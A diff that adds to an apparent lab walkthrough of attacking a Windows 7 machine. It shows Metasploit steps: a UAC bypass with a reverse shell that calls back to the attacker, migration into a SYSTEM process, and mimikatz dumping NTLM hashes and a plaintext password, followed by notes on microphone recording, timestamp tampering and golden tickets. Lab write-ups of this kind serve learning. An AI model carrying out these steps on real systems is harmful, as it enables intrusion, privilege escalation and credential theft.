@@ -207,9 +207,259 @@ OS is Windows 7, build `7601`. On `x64` architecture.
 We can further enumerate with a some `post` exploitations on our meterpreter shell.
 Lets use `post/multi/recon/local_exploit_suggester`.
 
+There're a lot of exploits being tested.
+Module appears to hang. But numerous vulns are found.
+
+```shell
+reter > run post/multi/recon/local_exploit_suggester
+
+[*] 10.10.70.52 - Collecting local exploits for x86/windows...
+[*] 10.10.70.52 - 34 exploit checks are being tried...
+[+] 10.10.70.52 - exploit/windows/local/bypassuac_eventvwr: The target appears to be vulnerable.
+nil versions are discouraged and will be deprecated in Rubygems 4
+[+] 10.10.70.52 - exploit/windows/local/ikeext_service: The target appears to be vulnerable.
+[+] 10.10.70.52 - exploit/windows/local/ms10_092_schelevator: The target appears to be vulnerable.
+[+] 10.10.70.52 - exploit/windows/local/ms13_053_schlamperei: The target appears to be vulnerable.
+[+] 10.10.70.52 - exploit/windows/local/ms13_081_track_popup_menu: The target appears to be vulnerable.
+[+] 10.10.70.52 - exploit/windows/local/ms14_058_track_popup_menu: The target appears to be vulnerable.
+[+] 10.10.70.52 - exploit/windows/local/ms15_051_client_copy_image: The target appears to be vulnerable.
+[+] 10.10.70.52 - exploit/windows/local/ntusermndragover: The target appears to be vulnerable.
+[+] 10.10.70.52 - exploit/windows/local/ppr_flatten_rec: The target appears to be vulnerable.
+meterpreter >
+```
+Background the meterpreter session with `bg`, then use the `bypassuac_eventvwr` exploit.
+
+```shell
+meterpreter > bg
+Backgrounding session 1...
+
+msf5 exploit(windows/http/icecast_header) > use exploit/windows/local/bypassuac_eventvwr
+[*] No payload configured, defaulting to windows/meterpreter/reverse_tcp
+msf5 exploit(windows/local/bypassuac_eventvwr) > set session 1
+session => 1
+msf5 exploit(windows/local/bypassuac_eventvwr) > show options
+
+Module options (exploit/windows/local/bypassuac_eventvwr):
+
+   Name     Current Setting  Required  Description
+   ----     ---------------  --------  -----------
+   SESSION  1                yes       The session to run this module on.
 
 
+Payload options (windows/meterpreter/reverse_tcp):
+
+   Name      Current Setting  Required  Description
+   ----      ---------------  --------  -----------
+   EXITFUNC  process          yes       Exit technique (Accepted: '', seh, thread, process, none)
+   LHOST     10.0.2.15        yes       The listen address (an interface may be specified)
+   LPORT     4444             yes       The listen port
 
 
+Exploit target:
+
+   Id  Name
+   --  ----
+   0   Windows x86
+
+
+msf5 exploit(windows/local/bypassuac_eventvwr) > set lhost tun0
+lhost => tun0
+msf5 exploit(windows/local/bypassuac_eventvwr) > run
+
+[*] Started reverse TCP handler on 10.11.8.219:4444
+[*] UAC is Enabled, checking level...
+[+] Part of Administrators group! Continuing...
+[+] UAC is set to Default
+[+] BypassUAC can bypass this setting, continuing...
+[*] Configuring payload and stager registry keys ...
+[*] Executing payload: C:\Windows\SysWOW64\eventvwr.exe
+[+] eventvwr.exe executed successfully, waiting 10 seconds for the payload to execute.
+[*] Sending stage (176195 bytes) to 10.10.70.52
+[*] Meterpreter session 2 opened (10.11.8.219:4444 -> 10.10.70.52:49298) at 2020-09-30 22:38:44 +0100
+[*] Cleaning up registry keys ...
+
+meterpreter > getprives
+[-] Unknown command: getprives.
+meterpreter > getprives
+[-] Unknown command: getprives.
+meterpreter > getprivs
+
+Enabled Process Privileges
+==========================
+
+Name
+----
+SeBackupPrivilege
+SeChangeNotifyPrivilege
+SeCreateGlobalPrivilege
+SeCreatePagefilePrivilege
+SeCreateSymbolicLinkPrivilege
+SeDebugPrivilege
+SeImpersonatePrivilege
+SeIncreaseBasePriorityPrivilege
+SeIncreaseQuotaPrivilege
+SeIncreaseWorkingSetPrivilege
+SeLoadDriverPrivilege
+SeManageVolumePrivilege
+SeProfileSingleProcessPrivilege
+SeRemoteShutdownPrivilege
+SeRestorePrivilege
+SeSecurityPrivilege
+SeShutdownPrivilege
+SeSystemEnvironmentPrivilege
+SeSystemProfilePrivilege
+SeSystemtimePrivilege
+SeTakeOwnershipPrivilege
+SeTimeZonePrivilege
+SeUndockPrivilege
+```
+
+We can now run `getprivs` and enumerate privileges.
+
+## Looting
+
+We can use `mimikatz` to loot the system. 
+After running `ps` previously, we saw various processes.
+We need to get into a process that's ran by NT AUTHORITY\SYSTEM.
+
+To interact with lsass we need to some some DLL injection.
+Can inject into print spool service.
+
+```shell
+1260  692   spoolsv.exe
+```
+
+To do this we can run `migrate` in to the meterpreter shell.
+This can be done with `-N PROCESSNAME` flag but I prefer to use process id.
+
+```shell
+meterpreter > migrate 1260
+[*] Migrating from 3876 to 1260...
+[*] Migration completed successfully.
+meterpreter >
+```
+
+After migrating, check the current user that we're using.
+We should now _be_ the process owner.
+
+```shell
+meterpreter > getuid
+Server username: NT AUTHORITY\SYSTEM
+meterpreter >
+```
+
+We essentially have _root_ access now.
+So, lets `load kiwi` aka. mikikatz.
+
+```shell
+meterpreter> load kiwi
+Loading extension kiwi...
+  .#####.   mimikatz 2.2.0 20191125 (x64/windows)
+ .## ^ ##.  "A La Vie, A L'Amour" - (oe.eo)
+ ## / \ ##  /*** Benjamin DELPY `gentilkiwi` ( benjamin@gentilkiwi.com )
+ ## \ / ##       > http://blog.gentilkiwi.com/mimikatz
+ '## v ##'        Vincent LE TOUX            ( vincent.letoux@gmail.com )
+  '#####'         > http://pingcastle.com / http://mysmartlogon.com  ***/
+
+Success.
+meterpreter >
+```
+
+When we run the `help` command--after loading kiwi--we'll see extra commands; commands that're related to kiwi/kerberous/mimikatz.
+
+```shell
+Kiwi Commands
+=============
+
+    Command                Description
+    -------                -----------
+    creds_all              Retrieve all credentials (parsed)
+    creds_kerberos         Retrieve Kerberos creds (parsed)
+    creds_msv              Retrieve LM/NTLM creds (parsed)
+    creds_ssp              Retrieve SSP creds
+    creds_tspkg            Retrieve TsPkg creds (parsed)
+    creds_wdigest          Retrieve WDigest creds (parsed)
+    dcsync                 Retrieve user account information via DCSync (unparsed)
+    dcsync_ntlm            Retrieve user account NTLM hash, SID and RID via DCSync
+    golden_ticket_create   Create a golden kerberos ticket
+    kerberos_ticket_list   List all kerberos tickets (unparsed)
+    kerberos_ticket_purge  Purge any in-use kerberos tickets
+    kerberos_ticket_use    Use a kerberos ticket
+    kiwi_cmd               Execute an arbitary mimikatz command (unparsed)
+    lsa_dump_sam           Dump LSA SAM (unparsed)
+    lsa_dump_secrets       Dump LSA secrets (unparsed)
+    password_change        Change the password/hash of a user
+    wifi_list              List wifi profiles/creds for the current user
+    wifi_list_shared       List shared wifi profiles/creds (requires SYSTEM)
+```
+
+This is where the fun comes in.
+We can loot all the things.
+`creds_all` gets all the creds. Who'd've guessed.
+
+```shell
+meterpreter > creds_all
+[+] Running as SYSTEM
+[*] Retrieving all credentials
+msv credentials
+===============
+
+Username  Domain   LM                                NTLM                              SHA1
+--------  ------   --                                ----                              ----
+Dark      Dark-PC  e52cac67419a9a22ecb08369099ed302  7c4fe5eada682714a036e39378362bab  0d082c4b4f2aeafb67fd0ea568a997e9d3ebc0eb
+
+wdigest credentials
+===================
+
+Username  Domain     Password
+--------  ------     --------
+(null)    (null)     (null)
+DARK-PC$  WORKGROUP  (null)
+Dark      Dark-PC    Password01!
+
+tspkg credentials
+=================
+
+Username  Domain   Password
+--------  ------   --------
+Dark      Dark-PC  Password01!
+
+kerberos credentials
+====================
+
+Username  Domain     Password
+--------  ------     --------
+(null)    (null)     (null)
+Dark      Dark-PC    Password01!
+dark-pc$  WORKGROUP  (null)
+
+
+meterpreter > Interrupt: use the 'exit' command to quit
+meterpreter >
+```
+
+This render's `Dark`'s password; `Password01!`.
+Mimikatz does this in a really interesting way.
+
+Even though `Dark` isn't actually logged in. 
+There's a process running _as_ `Dark`.
+And therefore, Mimikatz can pull `Dark`'s password out of memory!.
+
+## Post-exploitation
+
+We saw the post-explotation commands in the previous section. 
+Lets dive into some more..
+
+- `hashdump`: Dumps all victim's hashes
+- `screenshare`: Allows attacker to watch screen in realtime
+- `record_mic`: Records victim's microphone 
+- `timestomp`: Scrambles modified files' timestamps.
+- `golden_ticket_create`: (Mimikatz) allows us to generate a golden ticket for authenticating anywhere.
+
+We could also RDP into the system; firstly, enabling RDP on a system that has it disabled.
+
+```shell
+meterpreter> run post/windows/manage/enabled_rdp
+```
 
 
